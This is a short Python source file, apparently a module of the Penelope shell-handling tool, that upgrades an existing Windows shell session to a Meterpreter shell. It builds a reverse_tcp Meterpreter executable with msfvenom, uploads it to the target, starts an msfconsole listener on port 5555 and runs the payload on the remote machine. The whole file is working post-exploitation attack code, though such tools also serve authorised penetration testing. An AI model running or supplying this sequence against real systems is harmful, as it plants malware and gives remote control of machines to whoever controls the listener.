from .base import Module
from penelope_mod.constants import URLS
from penelope_mod.context import ctx
from penelope_mod.system import Open

class meterpreter(Module):
    def run(session, args):
        """
        Get a meterpreter shell
        """
        if session.OS == 'Unix':
            ctx.logger.error("This module runs only on Windows shells")
        else:
            payload_path = f"/dev/shm/{__import__('random').randrange(10**9)}.exe"
            host = session._host
            port = 5555
            payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
            result = __import__('subprocess').run(payload_creation_cmd, shell=True, text=True, capture_output=True)

            if result.returncode == 0:
                ctx.logger.info("Payload created!")
                uploaded_path = session.upload(payload_path)
                if uploaded_path:
                    meterpreter_handler_cmd = (
                        'msfconsole -x "use exploit/multi/handler; '
                        'set payload windows/meterpreter/reverse_tcp; '
                        f'set LHOST {host}; set LPORT {port}; run"'
                    )
                    Open(meterpreter_handler_cmd, terminal=True)
                    print(meterpreter_handler_cmd)
                    session.exec(uploaded_path[0])
            else:
                ctx.logger.error(f"Cannot create meterpreter payload: {result.stderr}")

